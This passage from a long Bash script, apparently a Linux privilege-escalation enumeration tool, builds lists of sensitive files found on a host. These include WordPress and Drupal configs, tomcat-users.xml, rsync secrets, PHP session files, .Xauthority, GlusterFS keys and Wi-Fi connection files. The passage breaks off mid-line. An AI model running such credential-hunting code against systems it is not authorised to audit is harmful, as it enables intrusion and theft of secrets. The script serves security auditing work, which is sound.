  1190	  PSTORAGE_APACHE_NGINX=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_TMP\n$FIND_DIR_CONCOURSE_KEYS\n$FIND_DIR_MNT\n$FIND_DIR_PRIVATE\n$FIND_DIR_CONCOURSE_AUTH\n$FIND_DIR_BIN\n$FIND_DIR_OPT\n$FIND_DIR_CDROM\n$FIND_DIR_MEDIA\n$FIND_DIR_SBIN\n$FIND_DIR_ETC\n$FIND_DIR_SNAP\n$FIND_DIR_SRV\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_USR\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "sites-enabled$|000-default\.conf$|php\.ini$|nginx\.conf$|nginx$" | sort | uniq | head -n 70)
  1191	  PSTORAGE_VARNISH=$(echo -e "$FIND_DIR_HOMESEARCH\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_TMP\n$FIND_DIR_CONCOURSE_KEYS\n$FIND_DIR_MNT\n$FIND_DIR_PRIVATE\n$FIND_DIR_CONCOURSE_AUTH\n$FIND_DIR_BIN\n$FIND_DIR_OPT\n$FIND_DIR_CDROM\n$FIND_DIR_MEDIA\n$FIND_DIR_SBIN\n$FIND_DIR_ETC\n$FIND_DIR_SNAP\n$FIND_DIR_SRV\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_USR\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "varnish$" | sort | uniq | head -n 70)
  1192	  PSTORAGE_PHP_SESSIONS=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E '/tmp/.*sess_.*|/var/tmp/.*sess_.*' | grep -E "^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}var" | grep -E "sess_.*$" | sort | uniq | head -n 70)
  1193	  PSTORAGE_PHP_FILES=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E ".*config.*\.php$|database\.php$|db\.php$|storage\.php$|settings\.php$" | sort | uniq | head -n 70)
  1194	  PSTORAGE_APACHE_AIRFLOW=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "airflow\.cfg$|webserver_config\.py$" | sort | uniq | head -n 70)
  1195	  PSTORAGE_X11=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "\.Xauthority$" | sort | uniq | head -n 70)
  1196	  PSTORAGE_WORDPRESS=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "wp-config\.php$" | sort | uniq | head -n 70)
  1197	  PSTORAGE_DRUPAL=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E '/default/settings.php' | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "settings\.php$" | sort | uniq | head -n 70)
  1198	  PSTORAGE_MOODLE=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E 'moodle/config.php' | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "config\.php$" | sort | uniq | head -n 70)
  1199	  PSTORAGE_TOMCAT=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "tomcat-users\.xml$" | sort | uniq | head -n 70)
  1200	  PSTORAGE_MONGO=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "mongod.*\.conf$" | sort | uniq | head -n 70)
  1201	  PSTORAGE_ROCKETCHAT=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}systemd|^${ROOT_FOLDER}lib|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "rocketchat\.service$" | sort | uniq | head -n 70)
  1202	  PSTORAGE_SUPERVISORD=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "supervisord\.conf$" | sort | uniq | head -n 70)
  1203	  PSTORAGE_CESI=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "cesi\.conf$" | sort | uniq | head -n 70)
  1204	  PSTORAGE_RSYNC=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "rsyncd\.conf$|rsyncd\.secrets$" | sort | uniq | head -n 70)
  1205	  PSTORAGE_RPCD=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -v -E '/init.d/|/sbin/|/usr/share/' | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "rpcd$" | sort | uniq | head -n 70)
  1206	  PSTORAGE_BITCOIN=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "bitcoin\.conf$" | sort | uniq | head -n 70)
  1207	  PSTORAGE_HOSTAPD=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "hostapd\.conf$" | sort | uniq | head -n 70)
  1208	  PSTORAGE_WIFI_CONNECTIONS=$(echo -e "$FIND_DIR_HOMESEARCH\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_TMP\n$FIND_DIR_CONCOURSE_KEYS\n$FIND_DIR_MNT\n$FIND_DIR_PRIVATE\n$FIND_DIR_CONCOURSE_AUTH\n$FIND_DIR_BIN\n$FIND_DIR_OPT\n$FIND_DIR_CDROM\n$FIND_DIR_MEDIA\n$FIND_DIR_SBIN\n$FIND_DIR_ETC\n$FIND_DIR_SNAP\n$FIND_DIR_SRV\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_USR\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc" | grep -E "system-connections$" | sort | uniq | head -n 70)
  1209	  PSTORAGE_PAM_AUTH=$(echo -e "$FIND_DIR_HOMESEARCH\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_TMP\n$FIND_DIR_CONCOURSE_KEYS\n$FIND_DIR_MNT\n$FIND_DIR_PRIVATE\n$FIND_DIR_CONCOURSE_AUTH\n$FIND_DIR_BIN\n$FIND_DIR_OPT\n$FIND_DIR_CDROM\n$FIND_DIR_MEDIA\n$FIND_DIR_SBIN\n$FIND_DIR_ETC\n$FIND_DIR_SNAP\n$FIND_DIR_SRV\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_USR\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc" | grep -E "pam\.d$" | sort | uniq | head -n 70)
  1210	  PSTORAGE_NFS_EXPORTS=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc" | grep -E "exports$" | sort | uniq | head -n 70)
  1211	  PSTORAGE_GLUSTERFS=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "glusterfs\.pem$|glusterfs\.ca$|glusterfs\.key$" | sort | uniq | head -n 70)
  1212	  PSTORAGE_ANACONDA_KS=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "anaconda-ks\.cfg$" | sort | uniq | head -n 70)
  1213	  PSTORAGE_TERRAFORM=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E 